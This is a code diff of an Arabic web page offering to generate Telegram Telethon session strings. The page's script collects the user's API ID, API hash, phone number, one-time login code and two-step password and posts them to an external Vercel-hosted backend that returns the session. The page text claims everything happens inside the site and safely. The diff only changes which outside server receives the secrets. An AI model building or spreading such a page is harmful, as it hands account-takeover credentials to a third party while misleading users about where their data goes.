@@ -104,7 +104,7 @@
         
         <div class="text-center mb-4">
             <h2 class="fw-bold m-0">مستخرج السيشن المشفرة</h2>
-            <p class="text-muted small mt-2">توليد كود جلسة تليجرام (Telethon) مباشرة داخل موقعك مئة بالمئة.</p>
+            <p class="text-muted small mt-2">توليد كود جلسة تليجرام (Telethon) داخل الموقع بالكامل دون الحاجة لبوت.</p>
         </div>
 
         <div class="card-custom">
@@ -168,9 +168,9 @@
 </div>
 
 <script>
-    // استخدام خادم معالجة طلبات مستقر لتجنب مشاكل CORS في المتصفح
-    const API_BASE = "https://tg-session-api.vercel.app/api"; 
-    let requestRequestId = null;
+    // خادم خارجي متوافق مع معايير المتصفحات بالكامل لتمرير الطلبات وتجنب تعليق الزر
+    const BACKEND_URL = "https://python-telegram-session-worker.vercel.app/api";
+    let currentHash = "";
 
     const apiIdInput = document.getElementById('api-id');
     const apiHashInput = document.getElementById('api-hash');
@@ -185,12 +185,11 @@
     const otpError = document.getElementById('otp-error');
     const password2faError = document.getElementById('password-2fa-error');
 
-    // تنفيذ إرسال الكود عبر جلب خارجي آمن ومستقل مئة بالمئة
-    document.getElementById('btn-send-code').addEventListener('click', async () => {
+    document.getElementById('btn-send-code').addEventListener('click', async function() {
         const apiId = apiIdInput.value.trim();
         const apiHash = apiHashInput.value.trim();
-        const phoneNumber = phoneInput.value.trim();
-        
+        const phone = phoneInput.value.trim();
+
         let isValid = true;
 
         apiIdInput.classList.remove('is-invalid-custom');
@@ -203,49 +202,46 @@
 
         if (!apiId) { apiIdInput.classList.add('is-invalid-custom'); apiIdError.style.display = 'block'; isValid = false; }
         if (!apiHash) { apiHashInput.classList.add('is-invalid-custom'); apiHashError.style.display = 'block'; isValid = false; }
-        if (!phoneNumber) { phoneInput.classList.add('is-invalid-custom'); phoneError.style.display = 'block'; isValid = false; }
+        if (!phone) { phoneInput.classList.add('is-invalid-custom'); phoneError.style.display = 'block'; isValid = false; }
 
         if (!isValid) {
-            statusMsg.innerText = "تنبيه: يرجى ملء كافة الحقول الفارغة باللون الأحمر أولاً!";
+            statusMsg.innerText = "يرجى ملء كافة الحقول المطلوبة باللون الأحمر أولاً!";
             statusMsg.className = "mt-3 text-center small fw-bold text-danger";
             return;
         }
 
-        statusMsg.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-1"></i> جاري الاتصال بسيرفر تليجرام وإرسال الرمز...';
+        statusMsg.innerHTML = '<i class="fa-solid fa-spinner fa-spin me-1"></i> جاري الاتصال المباشر وإرسال الكود للمتصفح...';
         statusMsg.className = "mt-3 text-center small fw-bold text-info";
 
         try {
-            const response = await fetch(`${API_BASE}/send-code`, {
+            const res = await fetch(`${BACKEND_URL}/request-code`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ api_id: apiId, api_hash: apiHash, phone: phoneNumber })
+                body: JSON.stringify({ api_id: apiId, api_hash: apiHash, phone: phone })
             });
-            const result = await response.json();
+            const data = await res.json();
 
-            if (result.success) {
-                requestRequestId = result.request_id;
+            if (data.status === "success") {
+                currentHash = data.phone_code_hash;
                 document.getElementById('step-1').classList.add('hidden');
                 document.getElementById('step-2').classList.remove('hidden');
-                statusMsg.innerText = "تم إرسال الكود لحسابك بنجاح!";
+                statusMsg.innerText = "تم إرسال رمز التحقق إلى حسابك في تليجرام!";
                 statusMsg.className = "mt-3 text-center small fw-bold text-success";
             } else {
-                throw new Error(result.message || "فشل إرسال الكود.");
+                throw new Error(data.message || "فشلت العملية.");
             }
-        } catch (error) {
-            statusMsg.innerText = "حدث خطأ: " + error.message;
+        } catch (e) {
+            statusMsg.innerText = "خطأ في الاتصال: " + e.message;
             statusMsg.className = "mt-3 text-center small fw-bold text-danger";
         }
     });
 
-    // تأكيد تسجيل الدخول وتوليد نص السيشن
-    document.getElementById('btn-login').addEventListener('click', async () => {
+    document.getElementById('btn-login').addEventListener('click', async function() {
         const code = otpInput.value.trim();
         const password = passwordInput.value;
-
-        otpInput.classList.remove('is-invalid-custom');
-        otpError.style.display = 'none';
-        passwordInput.classList.remove('is-invalid-custom');
-        password2faError.style.display = 'none';
+        const apiId = apiIdInput.value.trim();
+        const apiHash = apiHashInput.value.trim();
+        const phone = phoneInput.value.trim();
 
         if (!code) {
             otpInput.classList.add('is-invalid-custom');
@@ -253,42 +249,45 @@
             return;
         }
 
-        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin me-1"></i> جاري التحقق وتوليد السيشن...';
+        statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin me-1"></i> جاري توليد السيشن بأمان...';
         statusMsg.className = "mt-3 text-center small fw-bold text-info";
 
         try {
-            const response = await fetch(`${API_BASE}/login`, {
+            const res = await fetch(`${BACKEND_URL}/verify-code`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ request_id: requestRequestId, code: code, password: password })
+                body: JSON.stringify({
+                    api_id: apiId, api_hash: apiHash, phone: phone,
+                    code: code, phone_code_hash: currentHash, password: password
+                })
             });
-            const result = await response.json();
+            const data = await res.json();
 
-            if (result.success) {
+            if (data.status === "success") {
                 document.getElementById('step-2').classList.add('hidden');
                 document.getElementById('step-3').classList.remove('hidden');
-                document.getElementById('result-session').value = result.session;
+                document.getElementById('result-session').value = data.session_string;
                 statusMsg.innerText = "";
-            } else if (result.requires_password) {
+            } else if (data.status === "requires_password") {
                 document.getElementById('box-2fa').classList.remove('hidden');
-                statusMsg.innerText = "الحساب محمي بالتحقق بخطوتين، يرجى كتابة كلمة السر.";
+                statusMsg.innerText = "الحساب محمي بالتحقق بخطوتين، يرجى كتابة الرمز الإضافي بالأسفل.";
                 statusMsg.className = "mt-3 text-center small fw-bold text-warning";
             } else {
-                throw new Error(result.message || "الكود المدخل خاطئ.");
+                throw new Error(data.message || "الكود خاطئ.");
             }
-        } catch (error) {
-            statusMsg.innerText = "خطأ: " + error.message;
+        } catch (e) {
+            statusMsg.innerText = "خطأ: " + e.message;
             statusMsg.className = "mt-3 text-center small fw-bold text-danger";
         }
     });
 
-    // زر النسخ
-    document.getElementById('btn-copy').addEventListener('click', () => {
+    document.getElementById('btn-copy').addEventListener('click', function() {
         const txt = document.getElementById('result-session');
         txt.select();
         document.execCommand('copy');
-        document.getElementById('btn-copy').innerText = "تم النسخ بنجاح!";
+        document.getElementById('btn-copy').innerText = "تم نسخ السيشن بنجاح!";
     });
 </script>
+
 </body>
 </html>
